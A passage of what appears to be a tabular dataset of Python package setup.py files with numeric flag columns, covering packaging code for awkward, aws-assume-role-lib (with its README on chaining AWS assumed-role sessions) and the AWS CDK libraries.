                        get_platform(),
                        sys.version_info[0],
                        sys.version_info[1],
                    ),
                ),
                ""Release"",
            )
            found = False
            for x in os.listdir(dlldir):
                if x.endswith("".lib"") or x.endswith("".exp"") or x.endswith("".dll""):
                    print(
                        ""copying"",
                        os.path.join(dlldir, x),
                        ""-->"",
                        os.path.join(self.build_lib, ""awkward"", x),
                    )
                    shutil.copyfile(
                        os.path.join(dlldir, x),
                        os.path.join(self.build_lib, ""awkward"", x),
                    )
                    found = True
            if not found:
                dlldir = os.path.join(dlldir, ""Release"")
                for x in os.listdir(dlldir):
                    if x.endswith("".lib"") or x.endswith("".exp"") or x.endswith("".dll""):
                        print(
                            ""copying"",
                            os.path.join(dlldir, x),
                            ""-->"",
                            os.path.join(self.build_lib, ""awkward"", x),
                        )
                        shutil.copyfile(
                            os.path.join(dlldir, x),
                            os.path.join(self.build_lib, ""awkward"", x),
                        )
                        found = True

            print(""--- deleting libraries ----------------------------------------"")
            for x in os.listdir(outerdir):
                if x.endswith("".pyd""):
                    print(""deleting"", os.path.join(outerdir, x))
                    os.remove(os.path.join(outerdir, x))

        print(""--- begin normal install --------------------------------------"")
        setuptools.command.install.install.run(self)

    def get_outputs(self):
        outerdir = os.path.join(
            os.path.join(
                ""build"",
                ""lib.{}-{}.{}"".format(
                    get_platform(),
                    sys.version_info[0],
                    sys.version_info[1],
                ),
            )
        )
        outputdir = os.path.join(outerdir, ""awkward"")
        outbase = self.install_lib.rstrip(os.path.sep)

        outputs = []

        for original in setuptools.command.install.install.get_outputs(self):
            if ""egg-info"" in original:
                outputs.append(original)
            if original.startswith(os.path.join(outbase, ""awkward"") + os.path.sep):
                outputs.append(original)

        for root, _, files in os.walk(outputdir):
            root = root[len(outerdir) :].lstrip(os.path.sep)
            for file in files:
                trial = os.path.join(outbase, os.path.join(root, file))
                if trial not in outputs:
                    outputs.append(trial)

        return outputs


setup(
    install_requires=install_requires,
    extras_require=extras,
    ext_modules=[CMakeExtension(""awkward"")],
    cmdclass={""build_ext"": CMakeBuild, ""install"": Install, ""build_py"": BuildPy},
)
",1
aws-assume-role-lib-2.10.0,0,1,1,1,1,0,1,0,aws_assume_role_lib.py py.typed __init__.py __main__.py LICENSE PKG-INFO pyproject.toml README.md setup.py,"# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['aws_assume_role_lib']

package_data = \
{'': ['*']}

install_requires = \
['boto3>=1.17.51,<2.0.0']

setup_kwargs = {
    'name': 'aws-assume-role-lib',
    'version': '2.10.0',
    'description': 'Assumed role session chaining (with credential refreshing) for boto3',
    'long_description': '# aws-assume-role-lib\n**Assumed role session chaining (with credential refreshing) for boto3**\n\nThe typical way to use boto3 when programmatically assuming a role is to explicitly call [`sts.AssumeRole`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/sts.html#STS.Client.assume_role) and use the returned credentials to create a new [`boto3.Session`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/core/session.html) or client.\nIt looks like this mess of code:\n\n```python\nrole_arn = ""arn:aws:iam::123456789012:role/MyRole""\nsession = boto3.Session()\n\nsts = session.client(""sts"")\nresponse = sts.assume_role(\n    RoleArn=role_arn,\n    RoleSessionName=""something_you_have_to_think_about""\n)\n\ncredentials = response[""Credentials""]\n\nassumed_role_session = boto3.Session(\n    aws_access_key_id=credentials[""AccessKeyId""],\n    aws_secret_access_key=credentials[""SecretAccessKey""],\n    aws_session_token=credentials[""SessionToken""]\n)\n\n# use the session\nprint(assumed_role_session.client(""sts"").get_caller_identity())\n```\n\nThis code is verbose, requires specifying a role session name even if you don\'t care what it is, and must explicitly handle credential expiration and refreshing if needed (in a Lambda function, this is typically handled by calling `AssumeRole` in every invocation).\n\nWith `aws-assume-role-lib`, all that collapses down to a single line. The assumed role session automatically refreshes expired credentials and generates a role session name if one is not provided.\n\n```python\nrole_arn = ""arn:aws:iam::123456789012:role/MyRole""\nsession = boto3.Session()\n\nassumed_role_session = aws_assume_role_lib.assume_role(session, role_arn)\n\n# use the session\nprint(assumed_role_session.client(""sts"").get_caller_identity())\n```\n\nIn a Lambda function that needs to assume a role, you can create the assumed role session during initialization and use it for the lifetime of the execution environment, with `AssumeRole` calls only being made when necessary, not on every invocation.\n\nNote that in `~/.aws/config`, [you have the option to have profiles that assume a role based on another profile](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html), and this automatically handles refreshing expired credentials as well.\n\nIf you\'ve only used `boto3.client()` and are not familiar with boto3 sessions, [here\'s an explainer](https://ben11kehoe.medium.com/boto3-sessions-and-why-you-should-use-them-9b094eb5ca8e).\n\n# Installation\n\n```bash\npip install --user aws-assume-role-lib\n```\n\nOr just add [`aws_assume_role_lib.py`](https://raw.githubusercontent.com/benkehoe/aws-assume-role-lib/stable/aws_assume_role_lib/aws_assume_role_lib.py) to your project.\n\nView the release history [here](CHANGELOG.md).\n\n# Usage\n\n```python\nimport boto3\nfrom aws_assume_role_lib import assume_role\n\n# Get a session\nsession = boto3.Session()\n# or with a profile:\n# session = boto3.Session(profile_name=""my-profile"")\n\n# Assume the session\nassumed_role_session = assume_role(session, ""arn:aws:iam::123456789012:role/MyRole"")\n\n# do stuff with the original credentials\nprint(session.client(""sts"").get_caller_identity()[""Arn""])\n\n# do stuff with the assumed role\nprint(assumed_role_session.client(""sts"").get_caller_identity()[""Arn""])\n```\n\nIn Lambda, initialize the sessions outside the handler, and `AssumeRole` will only get called when necessary, rather than on every invocation:\n```python\nimport os\nimport boto3\nfrom aws_assume_role_lib import assume_role, generate_lambda_session_name\n\n# Get the Lambda session\nSESSION = boto3.Session()\n\n# Get the config\nROLE_ARN = os.environ[""ROLE_ARN""]\nROLE_SESSION_NAME = generate_lambda_session_name() # see below for details\n\n# Assume the session\nASSUMED_ROLE_SESSION = assume_role(SESSION, ROLE_ARN, RoleSessionName=ROLE_SESSION_NAME)\n\ndef handler(event, context):\n    # do stuff with the Lambda role using SESSION\n    print(SESSION.client(""sts"").get_caller_identity()[""Arn""])\n\n    # do stuff with the assumed role using ASSUMED_ROLE_SESSION\n    print(ASSUMED_ROLE_SESSION.client(""sts"").get_caller_identity()[""Arn""])\n```\nLearn more about the benefits of `aws-assume-role-lib` in Lambda functions in the [demo](lambda-demo/README.md).\n\n# Interface\n\n```\nassume_role(\n    # required arguments\n    session:           boto3.Session,\n    RoleArn:           str,\n\n    *,\n    # keyword-only arguments for AssumeRole\n    RoleSessionName:   str                                    = None,\n    PolicyArns:        Union[list[dict[str, str]], list[str]] = None,\n    Policy:            Union[str, dict]                       = None,\n    DurationSeconds:   Union[int, datetime.timedelta]         = None,\n    Tags:              list[dict[str, str]]                   = None,\n    TransitiveTagKeys: list[str]                              = None,\n    ExternalId:        str                                    = None,\n    SerialNumber:      str                                    = None,\n    TokenCode:         str                                    = None,\n    SourceIdentity:    str                                    = None,\n    additional_kwargs: dict                                   = None,\n\n    # keyword-only arguments for returned session\n    region_name:       Union[str, bool]                       = None,\n\n    # keyword-only arguments for assume_role() itself\n    validate:          bool                                   = True,\n    cache:             dict                                   = None,\n)\n```\n\n`assume_role()` takes a session and a role ARN, and optionally [other keyword arguments for `sts.AssumeRole`](https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/sts.html#STS.Client.assume_role).\n\nUnlike the `AssumeRole` API call itself, `RoleArn` is required, but `RoleSessionName` is not.\nThe `RoleSessionName` is set for you if it is not provided; it will use the [`SourceIdentity`](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_control-access_monitor.html) if that is provided, otherwise it will generated.\nIf you want this generated value for `RoleSessionName` when `SourceIdentity` is provided (the behavior in v2.8 and before), set `RoleSessionName` to the special value `aws_assume_role_lib.AUTOMATIC_ROLE_SESSION_NAME`.\n\nNote that unlike the boto3 sts client method, you can provide the `Policy` parameter (the [inline session policy](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#policies_session)) as a `dict` instead of as a serialized JSON string, `PolicyArns` as a list of ARNs, and `DurationSeconds` as a `datetime.timedelta` instead of as an integer.\n\nBy default, the session returned by `assume_role()` links its region configuration to the input session.\nIf you would like to set the region explicitly, pass it in the `region_name` parameter.\n\nNote that if the parent session was created without a region passed in to the `Session` constructor, it has an implicit region, based on searching potential configuration locations.\nThis means that the region used by the session can change (for example, if you set or change `os.environ[""AWS_DEFAULT_REGION""]`).\nBy default, the child session region is linked to the parent session, so if the parent session has an implicit region, or if the parent session\'s region is changed directly, they would both change.\nIf you would like to fix the child session region to be explicitly the current value, pass `region_name=True`.\nIf, for some reason, you have an explicit region set on the parent, and want the child to have implicit region config, pass `region_name=False`.\n\nBy default, `assume_role()` checks if the parameters are invalid.\nWithout this validation, errors for these issues are more confusingly raised when the child session is first used to make an API call (boto3 doesn\'t make the call to retrieve credentials until they are needed).\nHowever, this incurs a small time penalty, so parameter validation can be disabled by passing `validate=False`.\n\nIf any new arguments are added to `AssumeRole` in the future and this library is not updated to allow them directly, they can be passed in as a dict via the `additional_kwargs` argument.\n\nThe parent session is available on the child session in the `assume_role_parent_session` property.\nNote this property is added by this library; ordinary boto3 sessions do not have it.\n\n# Patching boto3\n\nYou can make the `assume_role()` function available directly in boto3 by calling `patch_boto3()`.\nThis creates a `boto3.assume_role(RoleArn, ...)` function (note that it does not take a session, it uses the same default session as `boto3.client()`), and adds a `boto3.Session.assume_role()` method.\nSo usage for that looks like:\n\n```python\nimport boto3\nimport aws_assume_role_lib\naws_assume_role_lib.patch_boto3()\n\nassumed_role_session = boto3.assume_role(""arn:aws:iam::123456789012:role/MyRole"")\n# the above is basically equivalent to:\n# aws_assume_role_lib.assume_role(boto3.Session(), ""arn:aws:iam::123456789012:role/MyRole"")\n\nsession = boto3.Session(profile_name=""my-profile"")\nassumed_role_session = session.assume_role(""arn:aws:iam::123456789012:role/MyRole"")\n```\n\n# Role session names for Lambda functions\nLearn more about the benefits of `aws-assume-role-lib` in Lambda functions in the [demo](lambda-demo/README.md).\n\nIf you don\'t provide a role session name, but you provide a [`SourceIdentity`](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_control-access_monitor.html), this value is used for the role session name as well.\nIf `SourceIdentity` is not provided either, the underlying `botocore` library [generates one using a timestamp](https://github.com/boto/botocore/blob/c53072ec257ef47e2fc749c384a9488fd3f3e626/botocore/credentials.py#L730).\nThat\'s the best it can do, because it doesn\'t have any other context.\n\nBut in a Lambda function, we do have additional context, the Lambda function itself.\nIf you call `generate_lambda_session_name()` inside an instance of a Lambda function, it returns a session name that corresponds to the function instance, which you can use when assuming a role in the Lambda function (either with this library\'s `assume_role()` or any other method).\nThe purpose of this is to simplify tracing usage of the session back to the function instance.\n\nThe returned value is in one of the following forms, depending on the length of the values, to keep the session name within the maximum of 64 characters:\n* `{function_name}`\n* `{function_name}.{identifier}`\n* `{function_name}.{function_version}.{identifier}`\n\nThe function version is never included if it is `$LATEST`.\n\nThe maximum role session name length is 64 characters. To ensure this, and\nto provide at least 4 characters of the identifier when it is used, the\nfollowing rules apply, in order:\n1. If the function name is longer than 59 characters, the session name is the truncated function name.\n2. If the function name plus the function version is longer than 59 characters, the session name is the function name plus the identifier, truncated.\n3. Otherwise, the session name is the function name plus the version (if one is found and not $LATEST) plus the identifier, truncated.\n\nThe identifier is the function instance\'s unique ID taken from the CloudWatch log stream name; if this cannot be found, it\'s a timestamp if the identifier can be at least 14 characters long (to provide for second-level precision), otherwise it is a random string.\nThe identifier will not be included unless at least 4 characters\n\nThe values are automatically extracted from [the relevant environment variables](https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html#configuration-envvars-runtime); you can override any of them by providing them as arguments to the function.\n\n# ARN formatting\n`assume_role()` requires a role ARN, and if you know the role name and account id but have trouble remembering the [exact format of role ARNs](https://docs.aws.amazon.com/service-authorization/latest/reference/list_identityandaccessmanagement.html#identityandaccessmanagement-resources-for-iam-policies), there\'s `get_role_arn()` for you.\nThere\'s additionally a `get_assumed_role_session_arn()` for formatting assumed role session ARNs.\n\n```\nget_role_arn(\n    account_id: Union[str, int],\n    role_name:  str,\n    path:       str             = """",\n    partition:  str             = ""aws"",\n)\n\nget_assumed_role_session_arn(\n    account_id:        Union[str, int],\n    role_name:         str,\n    role_session_name: str,\n    partition:         str             = ""aws"",\n)\n```\n\nFor `get_role_arn()`, if the role name has a path, it can be provided as part of the name or as the separate `path` argument (but not both).\nAssumed role session ARNs do not include the role path; if it is used in the role name it is removed.\n\n# Caching\n\nIf you would like to cache the credentials on the file system, you can use the `JSONFileCache` class, which will create files under the directory you provide in the constructor (which it will create if it doesn\'t exist).\nUse it like:\n```python\nassumed_role_session = assume_role(session, ""arn:aws:iam::123456789012:role/MyRole"", cache=JSONFileCache(""path/to/dir""))\n```\nYou can also use any `dict`-like object for the cache (supporting `__getitem__`/`__setitem__`/`__contains__`).\n\n# Command line use\n`aws-assume-role-lib` has basic support for retrieving assumed role credentials from the command line.\nIn general, it\'s better to make profiles in `~/.aws/config` for role assumption, like this:\n\n```ini\n# this is a pre-existing profile you already have\n[profile profile-to-call-assume-role-with]\n# maybe it\'s IAM User credentials\n# or AWS SSO config\n# or whatever else you may have\n\n[profile my-assumed-role]\nrole_arn = arn:aws:iam::123456789012:role/MyRole\n# optional: role_session_name = MyRoleSessionName\n\nsource_profile = profile-to-call-assume-role-with\n# or instead of source_profile, you can tell it to\n# use external credentials. one of:\n# credential_source = Environment\n# credential_source = Ec2InstanceMetadata\n# credential_source = EcsContainer\n```\n\nYou can use `my-assumed-role` like any other profile.\nIt uses the AWS SDKs\' built-in support for role assumption, rather than relying on this third party library.\nIt also gets you credential refreshing from the SDKs, where getting the credentials in the manner below cannot refresh them when they expire.\n\nBut if you absolutely must have ad hoc role assumption on the command line, use the module invocation syntax `python -m aws_assume_role_lib ROLE_ARN [OPTIONS]`.\n\nThe options are:\n* `--profile`: use a specific configuration profile.\n* `--env`: print the credentials as environment variables (the default), suitable for `export $(python -m aws_assume_role_lib ...)`.\n* `--json`: print the credentials in [`credential_process`-formatted JSON format](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-sourcing-external.html). Note that you don\'t normally need to use this as a `credential_process` in a profile, because you can just directly make the profile do role assumption as shown above.\n* The remaining options are the arguments to `assume_role()`:\n  * `--RoleSessionName`\n  * `--PolicyArns`: must be a comma-separated list of ARNs, a JSON list of ARNs, or a JSON object per the API\n  * `--Policy`: must be a JSON object\n  * `--DurationSeconds`\n  * `--Tags`: must be formatted as `Key1=Value1,Key2=Value2`, or a JSON object.\n  * `--TransitiveTagKeys`: must be a comma-separated list or a JSON list.\n  * `--ExternalId`\n  * `--SerialNumber`\n  * `--TokenCode`\n  * `--SourceIdentity`\n  * `--additional-kwargs`: must be a JSON object.\n',
    'author': 'Ben Kehoe',
    'author_email': 'ben@kehoe.io',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://github.com/benkehoe/aws-assume-role-lib',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'python_requires': '>=3.6,<4.0',
}


setup(**setup_kwargs)
",0
aws-cdk-lib-2.37.1,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py py.typed __init__.py __init__.py aws-cdk-lib@2.37.1.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk-lib"",
    ""version"": ""2.37.1"",
    ""description"": ""Version 2 of the AWS Cloud Development Kit library"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk"",
        ""aws_cdk._jsii"",
        ""aws_cdk.alexa_ask"",
        ""aws_cdk.assertions"",
        ""aws_cdk.aws_accessanalyzer"",
        ""aws_cdk.aws_acmpca"",
        ""aws_cdk.aws_amazonmq"",
        ""aws_cdk.aws_amplify"",
        ""aws_cdk.aws_amplifyuibuilder"",
        ""aws_cdk.aws_apigateway"",
        ""aws_cdk.aws_apigatewayv2"",
        ""aws_cdk.aws_appconfig"",
        ""aws_cdk.aws_appflow"",
        ""aws_cdk.aws_appintegrations"",
        ""aws_cdk.aws_applicationautoscaling"",
        ""aws_cdk.aws_applicationinsights"",
        ""aws_cdk.aws_appmesh"",
        ""aws_cdk.aws_apprunner"",
        ""aws_cdk.aws_appstream"",
        ""aws_cdk.aws_appsync"",
        ""aws_cdk.aws_aps"",
        ""aws_cdk.aws_athena"",
        ""aws_cdk.aws_auditmanager"",
        ""aws_cdk.aws_autoscaling"",
        ""aws_cdk.aws_autoscaling_common"",
        ""aws_cdk.aws_autoscaling_hooktargets"",
        ""aws_cdk.aws_autoscalingplans"",
        ""aws_cdk.aws_backup"",
        ""aws_cdk.aws_batch"",
        ""aws_cdk.aws_billingconductor"",
        ""aws_cdk.aws_budgets"",
        ""aws_cdk.aws_cassandra"",
        ""aws_cdk.aws_ce"",
        ""aws_cdk.aws_certificatemanager"",
        ""aws_cdk.aws_chatbot"",
        ""aws_cdk.aws_cloud9"",
        ""aws_cdk.aws_cloudformation"",
        ""aws_cdk.aws_cloudfront"",
        ""aws_cdk.aws_cloudfront_origins"",
        ""aws_cdk.aws_cloudfront.experimental"",
        ""aws_cdk.aws_cloudtrail"",
        ""aws_cdk.aws_cloudwatch"",
        ""aws_cdk.aws_cloudwatch_actions"",
        ""aws_cdk.aws_codeartifact"",
        ""aws_cdk.aws_codebuild"",
        ""aws_cdk.aws_codecommit"",
        ""aws_cdk.aws_codedeploy"",
        ""aws_cdk.aws_codeguruprofiler"",
        ""aws_cdk.aws_codegurureviewer"",
        ""aws_cdk.aws_codepipeline"",
        ""aws_cdk.aws_codepipeline_actions"",
        ""aws_cdk.aws_codestar"",
        ""aws_cdk.aws_codestarconnections"",
        ""aws_cdk.aws_codestarnotifications"",
        ""aws_cdk.aws_cognito"",
        ""aws_cdk.aws_config"",
        ""aws_cdk.aws_connect"",
        ""aws_cdk.aws_cur"",
        ""aws_cdk.aws_customerprofiles"",
        ""aws_cdk.aws_databrew"",
        ""aws_cdk.aws_datapipeline"",
        ""aws_cdk.aws_datasync"",
        ""aws_cdk.aws_dax"",
        ""aws_cdk.aws_detective"",
        ""aws_cdk.aws_devopsguru"",
        ""aws_cdk.aws_directoryservice"",
        ""aws_cdk.aws_dlm"",
        ""aws_cdk.aws_dms"",
        ""aws_cdk.aws_docdb"",
        ""aws_cdk.aws_dynamodb"",
        ""aws_cdk.aws_ec2"",
        ""aws_cdk.aws_ecr"",
        ""aws_cdk.aws_ecr_assets"",
        ""aws_cdk.aws_ecs"",
        ""aws_cdk.aws_ecs_patterns"",
        ""aws_cdk.aws_efs"",
        ""aws_cdk.aws_eks"",
        ""aws_cdk.aws_elasticache"",
        ""aws_cdk.aws_elasticbeanstalk"",
        ""aws_cdk.aws_elasticloadbalancing"",
        ""aws_cdk.aws_elasticloadbalancingv2"",
        ""aws_cdk.aws_elasticloadbalancingv2_actions"",
        ""aws_cdk.aws_elasticloadbalancingv2_targets"",
        ""aws_cdk.aws_elasticsearch"",
        ""aws_cdk.aws_emr"",
        ""aws_cdk.aws_emrcontainers"",
        ""aws_cdk.aws_emrserverless"",
        ""aws_cdk.aws_events"",
        ""aws_cdk.aws_events_targets"",
        ""aws_cdk.aws_eventschemas"",
        ""aws_cdk.aws_evidently"",
        ""aws_cdk.aws_finspace"",
        ""aws_cdk.aws_fis"",
        ""aws_cdk.aws_fms"",
        ""aws_cdk.aws_forecast"",
        ""aws_cdk.aws_frauddetector"",
        ""aws_cdk.aws_fsx"",
        ""aws_cdk.aws_gamelift"",
        ""aws_cdk.aws_globalaccelerator"",
        ""aws_cdk.aws_globalaccelerator_endpoints"",
        ""aws_cdk.aws_glue"",
        ""aws_cdk.aws_greengrass"",
        ""aws_cdk.aws_greengrassv2"",
        ""aws_cdk.aws_groundstation"",
        ""aws_cdk.aws_guardduty"",
        ""aws_cdk.aws_healthlake"",
        ""aws_cdk.aws_iam"",
        ""aws_cdk.aws_imagebuilder"",
        ""aws_cdk.aws_inspector"",
        ""aws_cdk.aws_inspectorv2"",
        ""aws_cdk.aws_iot"",
        ""aws_cdk.aws_iot1click"",
        ""aws_cdk.aws_iotanalytics"",
        ""aws_cdk.aws_iotcoredeviceadvisor"",
        ""aws_cdk.aws_iotevents"",
        ""aws_cdk.aws_iotfleethub"",
        ""aws_cdk.aws_iotsitewise"",
        ""aws_cdk.aws_iotthingsgraph"",
        ""aws_cdk.aws_iottwinmaker"",
        ""aws_cdk.aws_iotwireless"",
        ""aws_cdk.aws_ivs"",
        ""aws_cdk.aws_kafkaconnect"",
        ""aws_cdk.aws_kendra"",
        ""aws_cdk.aws_kinesis"",
        ""aws_cdk.aws_kinesisanalytics"",
        ""aws_cdk.aws_kinesisanalyticsv2"",
        ""aws_cdk.aws_kinesisfirehose"",
        ""aws_cdk.aws_kinesisvideo"",
        ""aws_cdk.aws_kms"",
        ""aws_cdk.aws_lakeformation"",
        ""aws_cdk.aws_lambda"",
        ""aws_cdk.aws_lambda_destinations"",
        ""aws_cdk.aws_lambda_event_sources"",
        ""aws_cdk.aws_lambda_nodejs"",
        ""aws_cdk.aws_lex"",
        ""aws_cdk.aws_licensemanager"",
        ""aws_cdk.aws_lightsail"",
        ""aws_cdk.aws_location"",
        ""aws_cdk.aws_logs"",
        ""aws_cdk.aws_logs_destinations"",
        ""aws_cdk.aws_lookoutequipment"",
        ""aws_cdk.aws_lookoutmetrics"",
        ""aws_cdk.aws_lookoutvision"",
        ""aws_cdk.aws_macie"",
        ""aws_cdk.aws_managedblockchain"",
        ""aws_cdk.aws_mediaconnect"",
        ""aws_cdk.aws_mediaconvert"",
        ""aws_cdk.aws_medialive"",
        ""aws_cdk.aws_mediapackage"",
        ""aws_cdk.aws_mediastore"",
        ""aws_cdk.aws_mediatailor"",
        ""aws_cdk.aws_memorydb"",
        ""aws_cdk.aws_msk"",
        ""aws_cdk.aws_mwaa"",
        ""aws_cdk.aws_neptune"",
        ""aws_cdk.aws_networkfirewall"",
        ""aws_cdk.aws_networkmanager"",
        ""aws_cdk.aws_nimblestudio"",
        ""aws_cdk.aws_opensearchservice"",
        ""aws_cdk.aws_opsworks"",
        ""aws_cdk.aws_opsworkscm"",
        ""aws_cdk.aws_panorama"",
        ""aws_cdk.aws_personalize"",
        ""aws_cdk.aws_pinpoint"",
        ""aws_cdk.aws_pinpointemail"",
        ""aws_cdk.aws_qldb"",
        ""aws_cdk.aws_quicksight"",
        ""aws_cdk.aws_ram"",
        ""aws_cdk.aws_rds"",
        ""aws_cdk.aws_redshift"",
        ""aws_cdk.aws_redshiftserverless"",
        ""aws_cdk.aws_refactorspaces"",
        ""aws_cdk.aws_rekognition"",
        ""aws_cdk.aws_resiliencehub"",
        ""aws_cdk.aws_resourcegroups"",
        ""aws_cdk.aws_robomaker"",
        ""aws_cdk.aws_route53"",
        ""aws_cdk.aws_route53_patterns"",
        ""aws_cdk.aws_route53_targets"",
        ""aws_cdk.aws_route53recoverycontrol"",
        ""aws_cdk.aws_route53recoveryreadiness"",
        ""aws_cdk.aws_route53resolver"",
        ""aws_cdk.aws_rum"",
        ""aws_cdk.aws_s3"",
        ""aws_cdk.aws_s3_assets"",
        ""aws_cdk.aws_s3_deployment"",
        ""aws_cdk.aws_s3_notifications"",
        ""aws_cdk.aws_s3objectlambda"",
        ""aws_cdk.aws_s3outposts"",
        ""aws_cdk.aws_sagemaker"",
        ""aws_cdk.aws_sam"",
        ""aws_cdk.aws_sdb"",
        ""aws_cdk.aws_secretsmanager"",
        ""aws_cdk.aws_securityhub"",
        ""aws_cdk.aws_servicecatalog"",
        ""aws_cdk.aws_servicecatalogappregistry"",
        ""aws_cdk.aws_servicediscovery"",
        ""aws_cdk.aws_ses"",
        ""aws_cdk.aws_ses_actions"",
        ""aws_cdk.aws_signer"",
        ""aws_cdk.aws_sns"",
        ""aws_cdk.aws_sns_subscriptions"",
        ""aws_cdk.aws_sqs"",
        ""aws_cdk.aws_ssm"",
        ""aws_cdk.aws_ssmcontacts"",
        ""aws_cdk.aws_ssmincidents"",
        ""aws_cdk.aws_sso"",
        ""aws_cdk.aws_stepfunctions"",
        ""aws_cdk.aws_stepfunctions_tasks"",
        ""aws_cdk.aws_synthetics"",
        ""aws_cdk.aws_timestream"",
        ""aws_cdk.aws_transfer"",
        ""aws_cdk.aws_voiceid"",
        ""aws_cdk.aws_waf"",
        ""aws_cdk.aws_wafregional"",
        ""aws_cdk.aws_wafv2"",
        ""aws_cdk.aws_wisdom"",
        ""aws_cdk.aws_workspaces"",
        ""aws_cdk.aws_xray"",
        ""aws_cdk.cloud_assembly_schema"",
        ""aws_cdk.cloudformation_include"",
        ""aws_cdk.custom_resources"",
        ""aws_cdk.cx_api"",
        ""aws_cdk.lambda_layer_awscli"",
        ""aws_cdk.lambda_layer_kubectl"",
        ""aws_cdk.lambda_layer_node_proxy_agent"",
        ""aws_cdk.pipelines"",
        ""aws_cdk.region_info"",
        ""aws_cdk.triggers""
    ],
    ""package_data"": {
        ""aws_cdk._jsii"": [
            ""aws-cdk-lib@2.37.1.jsii.tgz""
        ],
        ""aws_cdk"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""constructs>=10.0.0, <11.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.assets-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed assets@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.assets"",
    ""version"": ""1.168.0"",
    ""description"": ""This module is deprecated. All types are now available under the core module"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.assets"",
        ""aws_cdk.assets._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.assets._jsii"": [
            ""assets@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.assets"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.core==1.168.0"",
